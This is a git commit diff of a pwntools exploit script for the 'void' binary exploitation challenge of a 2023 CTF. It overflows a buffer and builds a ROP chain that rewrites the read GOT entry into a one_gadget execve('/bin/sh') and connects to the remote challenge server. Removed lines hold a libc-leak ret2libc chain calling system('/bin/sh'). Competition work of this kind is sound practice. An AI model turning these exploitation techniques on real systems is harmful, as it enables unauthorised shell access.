3e99e8c18ef10e0b44fd445caf3c4bb2d8de0886
szhan21 <shunda.zhang@intel.com>
2023-03-25 10:41:55 +0800

    Solving void...

--- CyberApocalypse2023/pwn/pwn_void/challenge/dec.py
+++ CyberApocalypse2023/pwn/pwn_void/challenge/dec.py
@@ -6,48 +6,51 @@ context.log_level = 'debug'
 offset = 72
 
 elf = ELF('./void')
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') 
-#libc = ELF('./glibc/libc.so.6') 
+libc = ELF('./glibc/libc.so.6') 
 
 padding = offset*'A'
 
-#ip, port=
-#io = remote(ip,port)
-io = process('./void')
+ip, port='161.35.168.118', 30070
+io = remote(ip,port)
 
-pop_rdi_ret = 0x4011bb
-pop_rsi_r15_ret = 0x4011b9
+#0x0000000000401108 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
 
-rop_chain = p64(pop_rdi_ret)
-rop_chain += p64(0)
-rop_chain += p64(pop_rsi_r15_ret)
-rop_chain += p64(elf.got['read'])
-rop_chain += p64(elf.got['read'])
-rop_chain += p64(0x401030)
-rop_chain += p64(elf.symbols['vuln'])
+#ropr void -m 10 #default ropr/ROP_gadget is not enought!!
+#0x004011b2: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
 
-payload = padding+rop_chain
+'''
+one_gadget challenge/glibc/libc.so.6
+0xc961a execve("/bin/sh", r12, r13)
+constraints:
+  [r12] == NULL || r12 == NULL
+  [r13] == NULL || r13 == NULL
+
+0xc961d execve("/bin/sh", r12, rdx)
+constraints:
+  [r12] == NULL || r12 == NULL
+  [rdx] == NULL || rdx == NULL
+
+0xc9620 execve("/bin/sh", rsi, rdx)
+constraints:
+  [rsi] == NULL || rsi == NULL
+  [rdx] == NULL || rdx == NULL
+
+'''
+
+one_gadget = 0xc961a
+offset = one_gadget - libc.sym['read']
+
+#print offset
+offset = 2**32 + offset
+
+read_got = elf.got['read']
+read_plt = elf.sym['read']
+
+rop_chain = p64(0x004011b2) + p64(offset) + p64(read_got+0x3d) + p64(0)*4
+rop_chain += p64(0x401108)
+rop_chain += p64(read_plt)
+
+payload = padding + rop_chain
+
 io.sendline(payload)
-print io.recvline()
-print io.recvline()
-print io.recvline()
-'''
-puts_addr = u64(io.recvline().strip().ljust(8, b'\x00'))
-
-#print hex(puts_addr)
-
-log.info("Leaked server's libc address, puts(): "+hex(puts_addr))
-
-server_libc_base = puts_addr - libc.symbols['puts']
-log.info("Leaked server's libc base address: "+hex(server_libc_base))
-
-libc.address = server_libc_base
-rop_libc = ROP(libc)
-rop_libc.call((rop_libc.find_gadget(['ret']))[0])  #!!Padding/16 bytes!
-rop_libc.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
-payload2 = padding + rop_libc.chain()
-
-io.sendlineafter('>> ','2')
-io.sendlineafter('Insert location of the library: ',payload2)
 io.interactive()
-'''
